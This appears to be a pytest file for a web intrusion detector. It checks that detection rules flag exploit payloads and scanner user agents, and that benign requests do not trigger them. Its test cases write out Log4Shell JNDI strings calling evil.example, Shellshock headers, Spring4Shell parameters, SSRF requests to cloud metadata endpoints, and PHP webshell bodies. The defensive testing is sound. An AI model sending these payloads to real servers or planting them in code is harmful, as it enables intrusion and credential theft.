"""R5 exploit kinds and R6 scanner agents (pattern matching only, nothing is executed)."""

from __future__ import annotations

import pytest
from helpers import FIREFOX, finding_for, hits_of, run, web


def _hit(finding, rule_id):
    return next(h for h in finding.hits if h.rule_id == rule_id)


def _fire(read_events, ip, *, path="/", headers=None, body=None):
    client = web(ip)
    if body is None:
        client.get(path, headers=headers or {})
    else:
        client.post(path, content=body, headers=headers or {})
    return finding_for(run(read_events), ip, "web")


CASES = [
    ("log4shell", "/?x=${jndi:ldap://evil.example/a}", {}, None),
    ("log4shell", "/?x=${${lower:j}ndi:ldap://evil.example/a}", {}, None),
    ("log4shell", "/?x=${${::-j}${::-n}${::-d}${::-i}:rmi://evil.example/a}", {}, None),
    ("log4shell", "/", {"X-Forwarded-For": "${jndi:ldap://evil.example/a}"}, None),
    ("log4shell", "/", {"user-agent": "${JNDI:dns://evil.example}"}, None),
    ("shellshock", "/cgi-bin/x", {"user-agent": "() { :;}; echo vulnerable"}, None),
    ("shellshock", "/", {"referer": "()   {  :  ;  }  ;"}, None),
    ("spring4shell", "/?class.module.classLoader.resources.context.x=1", {}, None),
    ("spring4shell", "/?class%252emodule%252eclassLoader.urls=1", {}, None),
    ("ssrf", "/fetch?url=http://169.254.169.254/latest/meta-data/", {}, None),
    ("ssrf", "/fetch?url=http://metadata.google.internal/computeMetadata/v1/", {}, None),
    ("ssrf", "/fetch?url=gopher://127.0.0.1:6379/_PING", {}, None),
    ("ssrf", "/", {}, '{"image": "file:///etc/hostname"}'),
    ("webshell", "/up", {}, "<?php system($_GET[1]); ?>"),
    ("webshell", "/up", {}, "<?= 1 ?>"),
    ("webshell", "/up", {}, "x=eval(base64_decode('AAAA'))"),
]


@pytest.mark.parametrize(("kind", "path", "headers", "body"), CASES)
def test_payload_fires_r5_with_its_kind(read_events, kind, path, headers, body):
    headers = {"user-agent": FIREFOX, **headers}
    finding = _fire(read_events, "198.51.100.90", path=path, headers=headers, body=body)
    assert "R5" in hits_of(finding)
    assert kind in _hit(finding, "R5").measured.split(" ")[0].split("/")


BENIGN = [
    ("/", {}, None),
    ("/products?id=42&sort=name", {}, None),
    ("/search?q=class+schedule&file=report.pdf", {}, None),
    ("/api/items", {"content-type": "application/json"}, '{"class": "A", "file": "a.txt"}'),
    ("/api/items", {"content-type": "application/json"}, '{"module": "x", "classLoader": 1}'),
    ("/page?name=${user}&tpl={{name}}", {}, None),
    ("/feed", {"accept": "application/xml"}, '<?xml version="1.0"?><a/>'),
    ("/js", {}, "function f() { return 1; }; var a = () => {};"),
    ("/docs?see=http://example.com/file", {}, None),
    ("/ip?addr=169.254.1.1&host=metadata.example.com", {}, None),
]


@pytest.mark.parametrize(("path", "headers", "body"), BENIGN)
def test_benign_traffic_does_not_fire_r5(read_events, path, headers, body):
    headers = {"user-agent": FIREFOX, **headers}
    finding = _fire(read_events, "198.51.100.91", path=path, headers=headers, body=body)
    assert "R5" not in hits_of(finding)


def test_several_kinds_in_one_request_are_all_reported(read_events):
    path = "/?a=${jndi:ldap://e/a}&b=http://169.254.169.254/"
    finding = _fire(read_events, "198.51.100.92", path=path)
    assert _hit(finding, "R5").measured.startswith("log4shell/ssrf pattern")


@pytest.mark.parametrize("agent", ["WPScan v3.8", "feroxbuster/2.10", "WhatWeb/0.5.5", "httpx/1.3"])
def test_new_scanner_agents_fire_r6(read_events, agent):
    web("198.51.100.93", agent).get("/")
    finding = finding_for(run(read_events), "198.51.100.93", "web")
    assert "R6" in hits_of(finding)


def test_normal_agent_does_not_fire_r6(read_events):
    web("198.51.100.94").get("/")
    finding = finding_for(run(read_events), "198.51.100.94", "web")
    assert "R6" not in hits_of(finding)
